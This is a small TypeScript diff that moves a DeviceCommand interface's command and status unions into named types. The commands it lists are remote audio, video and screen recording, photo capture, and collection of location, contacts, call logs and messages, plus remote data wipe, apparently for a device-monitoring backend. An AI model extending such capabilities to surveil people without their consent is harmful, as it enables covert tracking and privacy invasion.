@@ -1,10 +1,13 @@
 import { BaseRepository } from './repository.interface';
 
+export type CommandType = 'RECORD_AUDIO' | 'RECORD_VIDEO' | 'SCREEN_RECORDING' | 'TAKE_PHOTO' | 'GET_LOCATION' | 'GET_CONTACTS' | 'GET_CALL_LOGS' | 'GET_MESSAGES' | 'ENABLE_APP' | 'DISABLE_APP' | 'RESTART_DEVICE' | 'WIPE_DATA';
+export type CommandStatus = 'PENDING' | 'SENT' | 'EXECUTED' | 'FAILED' | 'CANCELLED';
+
 export interface DeviceCommand {
   id: string;
-  command: 'RECORD_AUDIO' | 'RECORD_VIDEO' | 'SCREEN_RECORDING' | 'TAKE_PHOTO' | 'GET_LOCATION' | 'GET_CONTACTS' | 'GET_CALL_LOGS' | 'GET_MESSAGES' | 'ENABLE_APP' | 'DISABLE_APP' | 'RESTART_DEVICE' | 'WIPE_DATA';
+  command: CommandType;
   payload?: any;
-  status: 'PENDING' | 'SENT' | 'EXECUTED' | 'FAILED' | 'CANCELLED';
+  status: CommandStatus;
   sentAt: Date;
   executedAt: Date | null;
   response: any;
